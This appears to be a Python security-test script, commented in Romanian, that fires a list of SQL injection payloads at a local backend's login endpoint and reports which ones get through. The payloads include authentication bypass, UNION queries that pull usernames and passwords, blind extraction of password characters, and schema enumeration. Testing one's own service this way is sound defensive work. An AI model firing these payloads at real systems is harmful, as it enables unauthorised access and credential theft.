import requests

BASE_URL = "http://backend:8080/api/ba-auth"  # Numele containerului backend

# 🔥 SQL Injection Payloads - Combină autentificarea bypass cu diverse metode de atac SQLi
SQLI_PAYLOADS = [
    "admin' OR '1'='1",
    "admin' --",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' OR 1=1 --",
    "admin') OR ('1'='1",
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT username, password FROM users --",
    "' UNION SELECT 1, version(), database() --",
    "' AND 1=CAST(version() AS INT) --",
    "admin' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 100 --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "admin' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
    "' OR EXISTS(SELECT table_name FROM information_schema.tables WHERE table_schema='public') --",
]

def test_sql_injection():
    print("\n[🔍] Running SQL Injection Test...\n")

    for i, payload in enumerate(SQLI_PAYLOADS, start=1):
        data = {"username": payload, "password": "password"}
        response = requests.post(f"{BASE_URL}/login", json=data)

        if response.status_code == 200 and "success" in response.text.lower():
            print(f"[✔] SQL Injection Vulnerability Found! Payload: {payload}")
        else:
            print(f"[✖] Payload {i} did not work.")

    print("\n✅ SQL Injection Test Completed!")

if __name__ == "__main__":
    test_sql_injection()
